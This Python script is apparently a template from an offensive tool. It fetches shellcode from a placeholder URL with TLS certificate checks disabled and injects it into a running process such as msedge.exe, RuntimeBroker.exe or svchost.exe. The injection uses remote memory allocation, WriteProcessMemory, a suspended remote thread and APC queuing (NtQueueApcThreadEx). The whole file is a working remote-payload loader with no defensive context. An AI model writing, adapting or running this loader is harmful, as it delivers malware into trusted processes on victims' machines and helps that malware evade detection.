# Customize remote_via_apc function at the bottom if needed.
# Default is: (["msedge.exe","RuntimeBroker.exe","svchost.exe"]) searches by order.
# You can also do: remote_via_apc(["PID"]). But be aware of proc arc and integrity.
exec(r'''
import ctypes, ssl, urllib.request, sys
import ctypes.wintypes as wintypes

MAX_PATH = 260
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ssl_context.check_hostname = False; ssl_context.verify_mode = ssl.CERT_NONE
url = "%%url%%"
with urllib.request.urlopen(url, context=ssl_context) as r:
    shellcode = r.read()

shellcode_size = len(shellcode)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True); ntdll   = ctypes.WinDLL("ntdll", use_last_error=True)
if not shellcode_size:
    sys.exit("Error with download")

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
TH32CS_SNAPPROCESS = 0x00000002
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
PROCESS_ALL_ACCESS = 0x1F0FFF
CREATE_SUSPENDED = 0x00000004
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD), ("th32ProcessID", wintypes.DWORD), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)), ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD), ("th32ParentProcessID", wintypes.DWORD), ("pcPriClassBase", ctypes.c_long), ("dwFlags", wintypes.DWORD), ("szExeFile", wintypes.WCHAR * MAX_PATH)]

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot; CreateToolhelp32Snapshot.argtypes = (wintypes.DWORD, wintypes.DWORD); CreateToolhelp32Snapshot.restype  = wintypes.HANDLE
Process32FirstW = kernel32.Process32FirstW; Process32FirstW.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)); Process32FirstW.restype  = wintypes.BOOL
Process32NextW = kernel32.Process32NextW; Process32NextW.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32)); Process32NextW.restype  = wintypes.BOOL
OpenProcess = kernel32.OpenProcess; OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD); OpenProcess.restype  = wintypes.HANDLE
VirtualAllocEx = kernel32.VirtualAllocEx; VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD); VirtualAllocEx.restype  = wintypes.LPVOID
VirtualFreeEx = kernel32.VirtualFreeEx; VirtualFreeEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD); VirtualFreeEx.restype  = wintypes.BOOL
WriteProcessMemory = kernel32.WriteProcessMemory; WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)); WriteProcessMemory.restype  = wintypes.BOOL
CreateRemoteThread = kernel32.CreateRemoteThread; CreateRemoteThread.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)); CreateRemoteThread.restype  = wintypes.HANDLE
CloseHandle = kernel32.CloseHandle; CloseHandle.argtypes = (wintypes.HANDLE,); CloseHandle.restype  = wintypes.BOOL
NtQueueApcThreadEx = ntdll.NtQueueApcThreadEx; NtQueueApcThreadEx.argtypes = (wintypes.HANDLE, wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, wintypes.ULONG); NtQueueApcThreadEx.restype = wintypes.LONG
NtAlertResumeThread = ntdll.NtAlertResumeThread; NtAlertResumeThread.argtypes = (wintypes.HANDLE, ctypes.POINTER(wintypes.ULONG)); NtAlertResumeThread.restype  = wintypes.LONG
RtlExitUserThread = ntdll.RtlExitUserThread; RtlExitUserThread_addr = ctypes.cast(RtlExitUserThread, ctypes.c_void_p).value
VirtualProtectEx = kernel32.VirtualProtectEx; VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)); VirtualProtectEx.restype = wintypes.BOOL
QUEUE_SPEC_USER_APC = 0x1

def can_open_process(pid, access=PROCESS_ALL_ACCESS):
    h = OpenProcess(access, False, pid)
    ret = bool(h)
    CloseHandle(h) if h else None
    return ret

def find_process_id_by_name(names):
    names = [n.lower() for n in names]
    found = {}
    s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if s == INVALID_HANDLE_VALUE:
        return None
    try:
        pe32 = PROCESSENTRY32()
        pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if Process32FirstW(s, ctypes.byref(pe32)):
            while True:
                n = pe32.szExeFile.rstrip("\x00").lower()
                if n in names and n not in found and can_open_process(pe32.th32ProcessID):
                    found[n] = pe32.th32ProcessID
                if not Process32NextW(s, ctypes.byref(pe32)):
                    break
    finally:
        CloseHandle(s)
    for n in names:
        if n in found:
            return found[n]

def remote_via_apc(targets):
    pid = None
    for t in targets:
        if str(t).isdigit():
            p = int(t)
            if can_open_process(p):
                pid = p
                break
        else:
            p = find_process_id_by_name([t])
            if p:
                pid = p
                break
    if not pid:
        raise RuntimeError("Targeted process not found.")

    print(f"Found target process PID = {pid}")
    hp = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not hp:
        raise OSError("OpenProcess failed.")

    mem = VirtualAllocEx(hp, None, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not mem:
        CloseHandle(hp)
        raise MemoryError("VirtualAllocEx failed.")

    w = ctypes.c_size_t()
    if not WriteProcessMemory(hp, mem, shellcode, shellcode_size, ctypes.byref(w)):
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise MemoryError("WriteProcessMemory failed.")

    old_protect = wintypes.DWORD()
    if not VirtualProtectEx(hp, mem, shellcode_size, PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise MemoryError("VirtualProtectEx failed to set RX.")

    thr = CreateRemoteThread(hp, None, 0, ctypes.c_void_p(RtlExitUserThread_addr), None, CREATE_SUSPENDED, None)
    if not thr:
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE); CloseHandle(hp)
        raise OSError("CreateRemoteThread failed.")

    st = NtQueueApcThreadEx(thr, None, ctypes.c_void_p(mem), None, None, None, QUEUE_SPEC_USER_APC)
    if st != 0:
        CloseHandle(thr); CloseHandle(hp)
        raise OSError(f"NtQueueApcThreadEx failed NTSTATUS: 0x{st:08X}")

    NtAlertResumeThread(thr, None)
    print("APC queued and thread alerted")
    CloseHandle(thr); CloseHandle(hp)

if __name__ == "__main__":
    try:
        remote_via_apc(["msedge.exe", "RuntimeBroker.exe", "svchost.exe"])
    except Exception as e:
        print(e, file=sys.stderr)
        sys.exit(1)

exit()
''')
